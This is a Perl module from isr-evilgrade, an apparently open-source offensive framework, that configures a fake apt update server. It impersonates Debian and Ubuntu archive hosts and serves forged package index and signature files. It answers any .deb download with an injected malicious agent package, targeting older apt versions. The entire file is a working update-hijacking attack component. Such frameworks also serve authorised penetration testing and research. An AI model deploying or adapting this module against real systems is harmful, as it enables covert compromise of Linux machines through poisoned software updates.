###############
# apt.pm
#
# Copyright 2010 Francisco Amato
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::apt;

use strict;
use Data::Dump qw(dump);

use isrcore::utils;

my $base = {
    'name'        => 'apt',
    'version'     => '1.1',
    'appver'      => '< 0.7.14ubuntu6 | ubuntu 10.04 LTS',
    'author'      => ['Leandro Costantino < lcostantino +[AT]+ gmail.com>'],
    'description' => qq{},
    'vh' =>
        '(ftp.br.debian.org|ar.archive.ubuntu.com|security.ubuntu.com|archive.ubuntu.com|security.debian.org)',
    'request' => [
        {   'req'    => 'Packages*.bz2',    #regex friendly
            'type'   => 'file',             #file|string|agent|install
            'method' => '',                 #any
            'bin'    => 1,
            'string' => '',
            'parse'  => 1,
            'file' => './include/debian/Packages.bz2'
        },
        {   'req'    => '(Release.gpg)',    #regex friendly
            'type'   => 'file',             #file|string|agent|install
            'method' => '',                 #any
            'bin'    => 1,
            'string' => '',
            'parse'  => 1,
            'file' => './include/debian/Release.gpg'
        },

        {   'req'    => '(Translation)',    #regex friendly
            'type'   => 'file',             #file|string|agent|install
            'method' => '',                 #any
            'bin'    => 1,
            'string' => '',
            'parse'  => 1,
            'file' => './include/debian/Translation.bz2'
        },

        {   'req'    => 'Sources.bz2',      #regex friendly
            'type'   => 'file',             #file|string|agent|install
            'method' => '',                 #any
            'bin'    => 1,
            'string' => '',
            'parse'  => 1,
            'file' => './include/debian/Sources.bz2'
        },

        {
            #           'req' => 'seed\-debian', #brequest
            'req'    => '\.deb',
            'type'   => 'agent',            #file|string|agent|install
            'method' => '',                 #any
            'bin'    => 1,
            'string' => '',
            'parse'  => 0,
            'file'   => ''
        },

#                    {
#                    'req' => '\.deb', #regex anything
#                    'type' => 'string', #file|string|agent|install
#                    'method' => '', #any
#               'bin'    => '',
#                   'string' => '',
#               'parse' => '1',
#                    'file' => '',
#                    'cheader' => "HTTP/1.1 302 Found\r\n"
#                            ."Location: http://ar.archive.ubuntu.com/<%MODULE%><%RND1%>.exe \r\n"
#                            ."Content-Length: 0 \r\n"
#                                . "Connection: close \r\n\r\n",
#
#                   },

    ],

    #Options
    'options' => {
        'agent' => {
            'val'  => './agent/debian/seed-debian_0.3_all.deb',
            'desc' => 'Agent to inject'
        },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },
        'version' => {
            'val'     => '\'7.\'.isrcore::utils::RndNum(2)',
            'hidden'  => 1,
            'dynamic' => 1,
        },
        'module' => {
            'val' =>
                'join("",(split(/\//,$module->{\'Base\'}->{\'options\'}->{\'brequest\'}->{\'val\'}))[-1]) ',
            'hidden'  => 1,
            'dynamic' => 1,
        },
        'rnd1' => {
            'val'     => 'isrcore::utils::RndNum(5)',
            'hidden'  => 1,
            'dynamic' => 1,
        }
    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
